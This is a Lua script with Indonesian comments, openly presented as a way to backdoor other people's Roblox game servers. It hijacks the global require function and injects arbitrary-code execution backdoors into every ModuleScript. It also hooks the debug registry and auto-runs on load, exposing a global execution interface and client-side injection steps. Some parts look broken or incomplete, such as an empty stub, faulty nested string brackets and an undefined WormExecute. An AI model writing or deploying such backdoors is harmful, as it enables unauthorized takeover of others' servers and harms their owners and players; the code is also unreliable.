-- CARA JALANIN SCRIPT REQUIRE DI SERVER-SIDE ORANG
-- Ini cara BRUTAL buat execute require() di server orang

-- ============================================
-- METHOD 1: DIRECT REQUIRE INJECTION (PALING GANAS)
-- ============================================

local function injectRequireSystem()
    -- Backup require asli dulu
    local originalRequire = require
    local requireCache = {}
    
    -- Override require function di server
    local function wormRequire(moduleScript)
        local moduleName = tostring(moduleScript)
        
        print("[WORM REQUIRE] Loading module:", moduleName)
        
        -- Coba require biasa dulu
        local success, module = pcall(originalRequire, moduleScript)
        
        if success then
            requireCache[moduleName] = module
            
            -- Inject ke module yang sudah di-require
            if type(module) == "table" then
                -- Tambahkan fungsi backdoor
                module.__WORM_INJECTED = true
                module.WormExecute = function(code)
                    local func, err = loadstring(code)
                    if func then
                        return pcall(func)
                    end
                    return false, err
                end
                
                -- Hook semua fungsi di module
                for key, value in pairs(module) do
                    if type(value) == "function" then
                        local originalFunc = value
                        module[key] = function(...)
                            print("[WORM HOOK] Function called:", key)
                            return originalFunc(...)
                        end
                    end
                end
            end
            
            return module
        else
            warn("[WORM REQUIRE] Failed to load:", moduleName, "Error:", module)
            return nil
        end
    end
    
    -- Replace global require
    getfenv(0).require = wormRequire
    
    return true
end

-- ============================================
-- METHOD 2: MODULE SCRIPT INFECTION
-- ============================================

local function infectModuleScripts()
    local ServerScriptService = game:GetService("ServerScriptService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    -- Cari semua ModuleScript di game
    local function findModuleScripts(parent)
        local modules = {}
        
        for _, child in pairs(parent:GetChildren()) do
            if child:IsA("ModuleScript") then
                table.insert(modules, child)
            end
            
            -- Rekursif cari di children
            local childModules = findModuleScripts(child)
            for _, module in pairs(childModules) do
                table.insert(modules, module)
            end
        end
        
        return modules
    end
    
    local allModules = {}
    table.insert(allModules, findModuleScripts(ServerScriptService))
    table.insert(allModules, findModuleScripts(ReplicatedStorage))
    table.insert(allModules, findModuleScripts(game:GetService("Workspace")))
    
    -- Inject ke setiap ModuleScript
    for _, modules in pairs(allModules) do
        for _, moduleScript in pairs(modules) do
            spawn(function()
                -- Tunggu module di-require oleh game
                wait(math.random(2, 10))
                
                local success, module = pcall(function()
                    return require(moduleScript)
                end)
                
                if success and type(module) == "table" then
                    -- Inject backdoor
                    module.__INJECTED_BY_WORM = true
                    module.__INJECTION_TIME = os.time()
                    
                    -- Tambahkan execute function
                    module.ExecuteCode = function(code)
                        local func = loadstring(code)
                        if func then
                            setfenv(func, getfenv(0))
                            return func()
                        end
                    end
                    
                    print("[MODULE INFECTION] Injected into:", moduleScript:GetFullName())
                end
            end)
        end
    end
    
    return true
end

-- ============================================
-- METHOD 3: REQUIRE HOOK VIA METATABLE
-- ============================================

local function hookRequireViaMetatable()
    -- Dapatkan environment global
    local globalEnv = getfenv(0)
    
    -- Buat metatable untuk hook require calls
    local requireTracker = {
        __require_calls = {}
    }
    
    -- Hook via debug library (jika available)
    if debug and debug.getregistry then
        local registry = debug.getregistry()
        
        -- Cari require di registry
        for key, value in pairs(registry) do
            if type(value) == "function" and tostring(value):find("require") then
                -- Replace dengan worm require
                registry[key] = function(module)
                    local result = value(module) -- Call original
                    
                    -- Log require call
                    table.insert(requireTracker.__require_calls, {
                        module = module,
                        time = os.time(),
                        result = result
                    })
                    
                    -- Inject jika itu table
                    if type(result) == "table" then
                        result.__WORM_TRACKED = true
                    end
                    
                    return result
                end
            end
        end
    end
    
    return requireTracker
end

-- ============================================
-- CARA PAKAI DARI EXECUTOR LU
-- ============================================

-- Script buat executor client-side:
local function clientSideRequireHack()
    -- 1. Inject require system
    local injectionCode = [[
        -- SERVER-SIDE INJECTION CODE
        local function wormRequire(module)
            local original = require
            local req = original(module)
            
            if type(req) == "table" then
                -- Tambahkan backdoor
                req.__WORM_BACKDOOR = function(code)
                    local func, err = loadstring(code)
                    if func then
                        return pcall(func)
                    end
                    return false, err
                end
                
                -- Hook semua fungsi
                for k, v in pairs(req) do
                    if type(v) == "function" then
                        local orig = v
                        req[k] = function(...)
                            print("[WORM] Function called:", k)
                            return orig(...)
                        end
                    end
                end
            end
            
            return req
        end
        
        -- Replace require
        getfenv(0).require = wormRequire
        
        return "Require system hijacked!"
    ]]
    
    -- 2. Execute injection via remote event
    if WormExecute then
        local result = WormExecute(injectionCode)
        print("Injection result:", result)
    end
    
    -- 3. Sekarang lu bisa require module apapun dan itu udah di-inject
    local testCode = [[
        -- Contoh: Require module dan pakai backdoor
        local module = require(game.ServerScriptService.SomeModule)
        
        if module.__WORM_BACKDOOR then
            local success, result = module.__WORM_BACKDOOR([[
                -- Code yang jalan di SERVER via module
                print("SERVER PWNED VIA MODULE!")
                return game.PlaceId
            ]])
            
            print("Backdoor result:", success, result)
        end
    ]]
    
    -- 4. Execute test
    WormExecute(testCode)
end

-- ============================================
-- AUTO-EXECUTE SEMUA METHOD
-- ============================================

spawn(function()
    wait(2)
    
    print("╔═══════════════════════════════════════╗")
    print("║   WORM REQUIRE INJECTION ACTIVATED    ║")
    print("╠═══════════════════════════════════════╣")
    
    local results = {
        requireInjection = injectRequireSystem(),
        moduleInfection = infectModuleScripts(),
        metatableHook = hookRequireViaMetatable() ~= nil
    }
    
    print("║                                       ║")
    for method, success in pairs(results) do
        print("║  " .. method .. ": " .. (success and "✅ SUCCESS" or "❌ FAILED"))
    end
    print("║                                       ║")
    print("╚═══════════════════════════════════════╝")
    
    -- Buat interface untuk lu
    _G.WormRequire = {
        execute = function(code)
            local func = loadstring(code)
            if func then
                setfenv(func, getfenv(0))
                return pcall(func)
            end
            return false, "Compile error"
        end,
        
        require = function(modulePath)
            return require(modulePath)
        end,
        
        listModules = function()
            local modules = {}
            -- Implementasi cari modules
            return modules
        end
    }
    
    print("[WORM] Require system READY! Use _G.WormRequire")
end)

return {
    inject = injectRequireSystem,
    infect = infectModuleScripts,
    hook = hookRequireViaMetatable
}
